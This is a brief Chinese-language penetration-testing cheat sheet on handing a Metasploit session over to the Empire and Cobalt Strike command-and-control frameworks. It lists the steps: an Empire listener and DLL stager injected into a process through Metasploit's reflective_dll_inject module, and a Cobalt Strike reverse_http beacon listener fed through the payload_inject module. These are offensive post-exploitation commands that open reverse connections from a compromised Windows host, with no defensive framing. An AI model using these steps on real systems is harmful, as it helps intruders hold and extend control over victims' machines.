  ##### 派生Empire
	Empire创建一个Listener
	创建一个stager选择windows/dll
	MSF使用
	>use post/windows/manage/reflective_dll_inject 
	指定session，dll的路径，进程pid
  ##### 派生Cobalt Strike
	cobalt 开启一个监听器windows/beacon_http/reverse_http
	msf 
	>use exploit/windows/manage/payload_inject
	指定IP、端口、payload即可